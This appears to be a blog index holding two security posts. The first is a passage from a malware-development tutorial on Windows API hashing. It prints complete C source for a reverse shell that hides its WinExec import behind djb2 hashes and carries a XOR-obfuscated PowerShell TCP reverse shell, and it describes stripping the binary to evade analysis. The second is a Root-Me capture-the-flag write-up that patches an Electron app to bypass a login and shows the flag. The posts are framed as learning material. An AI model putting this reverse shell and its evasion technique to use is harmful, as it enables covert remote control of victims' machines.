(char*)dll_handle+export_table-\u0026gt;Name); return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } Nice it works. Now we just have to \u0026ldquo;obfuscate\u0026rdquo; the name of our DLLs.\nAfter searching a bit on google I found the djb2 algorithm wich seems fast and interesting.\nunsigned long hash_djb2(unsigned char *str) { unsigned long hash = 5381; int c; while (c = *str++) hash = ((hash \u0026lt;\u0026lt; 5) + hash) + c; /* hash * 33 + c */ return hash; } If we call our hash fonction with \u0026ldquo;WinExec\u0026rdquo; argument we have this output :\nprintf(\u0026#34;%lu\\n\u0026#34;, hash_djb2(\u0026#34;WinExec\u0026#34;)); // output : 698766968 So our final function is :\nvoid* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u0026gt;NumberOfNames; DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); for(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\u0026#34;%s\\n\u0026#34;,name); if (hashed_function_name == hash_djb2(name)) { return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } and our final reverse shell looks like this :\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; typedef UINT(WINAPI* winexec)(LPCSTR lpCmdLine, UINT uCmdShow); void* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name); unsigned long hash_djb2(unsigned char *str); void xor(char* string, unsigned long key); int main(void) { // get handle of kernel32.dll unsigned long hash_function_name = 698766968; // char payload[] = \u0026#34;powershell -nop -c \\\u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;127.0.0.1\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\u0026#34;\u0026#34;; char payload[] = \u0026#34;\\x09\\x18\\x10\\x1e\\x0b\\x0c\\x11\\x1e\\x15\\x15\\x59\\x56\\x17\\x18\\x09\\x59\\x56\\x1c\\x59\\x5b\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x59\\x46\\x59\\x37\\x1e\\x10\\x56\\x38\\x1b\\x13\\x1e\\x1c\\x0d\\x59\\x2c\\x02\\x0c\\x0d\\x1e\\x16\\x57\\x37\\x1e\\x0d\\x57\\x2c\\x18\\x1c\\x14\\x1e\\x0d\\x0c\\x57\\x2d\\x3c\\x29\\x3c\\x15\\x12\\x1e\\x17\\x0d\\x51\\x60\\x4a\\x4b\\x50\\x57\\x49\\x57\\x49\\x57\\x4a\\x60\\x55\\x4d\\x4d\\x4d\\x4d\\x52\\x44\\x5d\\x0c\\x59\\x46\\x59\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x57\\x40\\x1e\\x0d\\x2c\\x0d\\x0b\\x1e\\x1a\\x16\\x51\\x52\\x44\\x24\\x1b\\x02\\x0d\\x1e\\x24\\x26\\x26\\x5d\\x1b\\x59\\x46\\x59\\x49\\x57\\x57\\x4f\\x4e\\x4e\\x4c\\x4e\\x05\\x5e\\x04\\x49\\x06\\x44\\x10\\x11\\x12\\x15\\x1e\\x51\\x51\\x5d\\x12\\x59\\x46\\x59\\x5d\\x0c\\x57\\x2b\\x1e\\x1a\\x1d\\x51\\x5d\\x1b\\x55\\x59\\x49\\x55\\x59\\x5d\\x1b\\x57\\x35\\x1e\\x17\\x20\\x0d\\x11\\x52\\x52\\x59\\x56\\x17\\x1e\\x59\\x49\\x52\\x04\\x44\\x5d\\x1d\\x1a\\x0d\\x1a\\x59\\x46\\x59\\x51\\x37\\x1e\\x10\\x56\\x38\\x1b\\x13\\x1e\\x1c\\x0d\\x59\\x56\\x2d\\x02\\x09\\x1e\\x37\\x1a\\x16\\x1e\\x59\\x2c\\x02\\x0c\\x0d\\x1e\\x16\\x57\\x2d\\x1e\\x01\\x0d\\x57\\x3a\\x2c\\x3c\\x32\\x32\\x3e\\x17\\x1c\\x18\\x1d\\x12\\x17\\x20\\x52\\x57\\x40\\x1e\\x0d\\x2c\\x0d\\x0b\\x12\\x17\\x20\\x51\\x5d\\x1b\\x55\\x49\\x55\\x59\\x5d\\x12\\x52\\x44\\x5d\\x0c\\x1b\\x59\\x46\\x59\\x51\\x12\\x1e\\x01\\x59\\x5d\\x1d\\x1a\\x0d\\x1a\\x59\\x4b\\x47\\x5f\\x4a\\x59\\x05\\x59\\x38\\x0e\\x0d\\x56\\x2c\\x0d\\x0b\\x12\\x17\\x20\\x59\\x52\\x44\\x5d\\x0c\\x1b\\x4b\\x59\\x46\\x59\\x5d\\x0c\\x1b\\x59\\x54\\x59\\x60\\x29\\x2c\\x59\\x60\\x59\\x54\\x59\\x51\\x09\\x10\\x1d\\x52\\x57\\x29\\x1a\\x0d\\x11\\x59\\x54\\x59\\x60\\x47\\x59\\x60\\x44\\x5d\\x0c\\x1b\\x0d\\x59\\x46\\x59\\x51\\x24\\x0d\\x1e\\x01\\x0d\\x57\\x1e\\x17\\x1c\\x18\\x1d\\x12\\x17\\x20\\x26\\x43\\x43\\x3a\\x2c\\x3c\\x32\\x32\\x52\\x57\\x40\\x1e\\x0d\\x3b\\x02\\x0d\\x1e\\x0c\\x51\\x5d\\x0c\\x1b\\x4b\\x52\\x44\\x5d\\x0c\\x57\\x30\\x0b\\x12\\x0d\\x1e\\x51\\x5d\\x0c\\x1b\\x0d\\x55\\x49\\x55\\x5d\\x0c\\x1b\\x0d\\x57\\x35\\x1e\\x17\\x20\\x0d\\x11\\x52\\x44\\x5d\\x0c\\x57\\x3f\\x15\\x0e\\x0c\\x11\\x51\\x52\\x06\\x44\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x57\\x3c\\x15\\x18\\x0c\\x1e\\x51\\x52\\x5b\u0026#34;; xor(payload, hash_function_name); HMODULE kernel32_dll = LoadLibrary(\u0026#34;kernel32.dll\u0026#34;); // parse it to find the WinExec function //winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, \u0026#34;WinExec\u0026#34;); winexec WinExec_imported = (winexec)my_GetProcAddress(kernel32_dll, 698766968); WinExec_imported(payload, SW_HIDE); return 0; } void xor(char* string, unsigned long key) { while (*string) { *string -= 1; *string++ ^= (char)(key \u0026amp; 0xff); } } void* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u0026gt;NumberOfNames; DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); for(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\u0026#34;%s\\n\u0026#34;,name); if (hashed_function_name == hash_djb2(name)) { return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } unsigned long hash_djb2(unsigned char *str) { unsigned long hash = 5381; int c; while (c = *str++) hash = ((hash \u0026lt;\u0026lt; 5) + hash) + c; /* hash * 33 + c */ return hash; } i changed my mind, instead of using GetModuleHandle() which just returns the base address only if a module is loaded in memory I used LoadLibrary() wich will load the library if it is not loaded and also return its handle.\nwe compile it :\ngcc reverse-shell.c -s -o reverse-shell.exe I just obfuscated a bit the powershell payload with a simple xor and compile it with the -s flag to strip our PE. Stripping a PE means to discard these debugging symbols (like the function name). Stripping a binary reduces its size on the disk and makes it a little more difficult to debug and reverse engineer.\nour main function now :\nand our own GetProcAddress is a bit hard to recognize (of course an experimented reverse engineer will recognize it easily):\nThe WinExec and GetProcAddress functions are now totally absent in the IAT.\nConclusion That\u0026rsquo;s all for this post, I hope you enjoyed it. If I said some things wrong or if I made any mistake feel free to report them to me. Same, if you don\u0026rsquo;t understand something contact me on Discord or Twitter. I will be happy to help you. Next time we will see how to make our own GetModuleHandle by parsing the Process Block Environment and make a PE without an import table.\n","permalink":"https://trikkss.github.io/posts/hiding_windows_api_calls_part1/","summary":"Windows API Hashing is a technique often used by malware developers to hide their calls to the windows API.","title":"Malware - Windows API hashing 1"},{"content":"PROTONIC VAULT Hello, today i will explain how i solved the Protonic Vault challenge from the Root-Me capture the flag.\nChallenge content user@debian:~/protonic_vault$ tree protonic-vault\rprotonic-vault\r├── chrome_100_percent.pak\r├── chrome_200_percent.pak\r├── d3dcompiler_47.dll\r├── ffmpeg.dll\r├── icudtl.dat\r├── libEGL.dll\r├── libGLESv2.dll\r├── LICENSE\r├── LICENSES.chromium.html\r├── locales\r│ ├── af.pak\r│ ├── am.pak\r│ ├── ar.pak\r│ ├── bg.pak\r│ ├── bn.pak\r│ ├── ca.pak\r│ ├── cs.pak\r│ ├── da.pak\r[...]\r│ ├── te.pak\r│ ├── th.pak\r│ ├── tr.pak\r│ ├── uk.pak\r│ ├── ur.pak\r│ ├── vi.pak\r│ ├── zh-CN.pak\r│ └── zh-TW.pak\r├── protonic-vault.exe\r├── resources\r│ └── app.asar\r├── resources.pak\r├── snapshot_blob.bin\r├── v8_context_snapshot.bin\r├── version\r├── vk_swiftshader.dll\r├── vk_swiftshader_icd.json\r└── vulkan-1.dll Let\u0026rsquo;s uncompress the protonic-vault.zip file given for this challenge and execute protonic-vault.exe.\nThe application asks a password. Obviously, we don\u0026rsquo;t know it. I tried to reverse engineer this executable but it was hard. So i decided to look at the other files. The resources/app.asar file seemed interesting. After some google research I deduced that this application was an electron application. We can found the official github of Asar here\nSo let\u0026rsquo;s decompile this app.asar file !\nAsar decompilation We must first install asar. We can do it with this command.\nnpm install --engine-strict @electron/asar and now let\u0026rsquo;s extract this archive.\nuser@debian:~/protonic_vault/protonic-vault/resources$ asar --help\rUsage: asar [options] [command]\rManipulate asar archive files\rOptions:\r-V, --version output the version number\r-h, --help display help for command\rCommands:\rpack|p [options] \u0026lt;dir\u0026gt; \u0026lt;output\u0026gt; create asar archive\rlist|l [options] \u0026lt;archive\u0026gt; list files of asar archive\rextract-file|ef \u0026lt;archive\u0026gt; \u0026lt;filename\u0026gt; extract one file from archive\rextract|e \u0026lt;archive\u0026gt; \u0026lt;dest\u0026gt; extract archive\r*\rhelp [command] display help for command\ruser@debian:~/protonic_vault/protonic-vault/resources$ asar extract app.asar app_extracted\ruser@debian:~/protonic_vault/protonic-vault/resources$ ls\rapp.asar app_extracted\ruser@debian:~/protonic_vault/protonic-vault/resources$ ls app_extracted/\rimg index.html node_modules package.json src styles Nice ! Here is the extracted the source code of our application. The src/ folder seems interesting.\nsrc/\r├── main.js\r├── preload.js\r├── renderer.js\r└── window.jsc In the renderer.js file we can recognize our login form.\nasync function setupHandler() { let truePassword = await window.electronAPI.getPassword() document.getElementById(\u0026#34;passForm\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, async e =\u0026gt; { e.preventDefault() const passwordInput = document.getElementById(\u0026#34;password\u0026#34;) const password = passwordInput.value const resultDiv = document.getElementById(\u0026#34;result\u0026#34;) resultDiv.hidden = false if (password === truePassword) { resultDiv.innerHTML = `Welcome, dear master!\u0026lt;br/\u0026gt;Flag: ${await window.electronAPI.getFlag()}` resultDiv.className = \u0026#34;notification is-success\u0026#34; } else { resultDiv.textContent = \u0026#34;You\u0026#39;re wrong!!\u0026#34; resultDiv.className = \u0026#34;notification is-danger\u0026#34; } }) } setupHandler() The method window.electronAPI.getPassword() ask for the password. It means that our password is located in the window.jsc file, but this file is compiled into v8 bytecode.\nApplication patching I was very lazy to decompile it so I had another idea. If we patch the renderer.js file and compile it again into an other app.asar will this work? I tried. This is our new renderer.js file.\nasync function setupHandler() { let truePassword = await window.electronAPI.getPassword() document.getElementById(\u0026#34;passForm\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, async e =\u0026gt; { e.preventDefault() const passwordInput = document.getElementById(\u0026#34;password\u0026#34;) const password = passwordInput.value const resultDiv = document.getElementById(\u0026#34;result\u0026#34;) resultDiv.hidden = false resultDiv.innerHTML = `Welcome, dear master!\u0026lt;br/\u0026gt;Flag: ${await window.electronAPI.getFl\u0026gt; resultDiv.className = \u0026#34;notification is-success\u0026#34; }) } setupHandler() I just removed the condition. We compile again our patched application.\nuser@debian:~/protonic_vault/protonic-vault/resources$ asar pack app_extracted/ new_app.asar and we replace the old app.asar with our new file.\nFlag Then we executed again the protonic-vault.exe, click on submit with any password and it works ! we are login and we can get the flag.\nFlag : RM{V8_byt3c0d3_1s_n0t_3n0ugh}\nGreetings Thanks to Root-Me and Elf for this challenge. I am very glad about it being interesting at all because it was the first time I reverse engineer this type of application.\n","permalink":"https://trikkss.github.io/posts/protonic-vault-wu/","summary":"Write up of the Protonic Vault challenge from the 10k Root-Me CTF.","title":"Protonic Vault write up"}]